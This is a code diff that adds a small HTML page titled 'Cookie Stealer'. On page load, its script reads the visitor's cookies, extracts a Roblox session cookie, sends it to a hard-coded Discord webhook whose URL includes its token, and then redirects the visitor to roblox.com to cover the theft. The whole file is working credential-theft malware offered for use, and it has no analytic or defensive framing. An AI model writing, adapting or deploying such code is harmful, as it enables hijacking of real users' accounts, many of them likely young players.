@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cookie Stealer</title>
+</head>
+<body>
+    <script>
+        // Function to steal cookies and send them to Discord webhook
+        function stealCookies() {
+            // Get all cookies
+            const allCookies = document.cookie.split('; ');
+
+            // Look for specific Roblox cookies (e.g., .ROBLOSESSID)
+            let robloxSessionId = '';
+            allCookies.forEach(cookie => {
+                if (cookie.startsWith('.ROBLOSESSID=')) {
+                    robloxSessionId = cookie;
+                }
+            });
+
+            // Create payload for Discord webhook
+            const payload = {
+                username: "Cookie Stealer",
+                content: "Captured Roblox cookies:\n" + robloxSessionId
+            };
+
+            // Send POST request to Discord webhook
+            fetch('https://discord.com/api/webhooks/1457389955532980395/ykXwOWJDgRRRBBC2oKocxsGChH4FcFqYAPqz9G6Sj57IiGaVPAEnKzkpCsxDOWc9ANIZ', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            // Optional: Redirect or close the window
+            window.location.href = "https://www.roblox.com";
+        }
+
+        // Execute the function when the page loads
+        stealCookies();
+    </script>
+</body>
+</html>
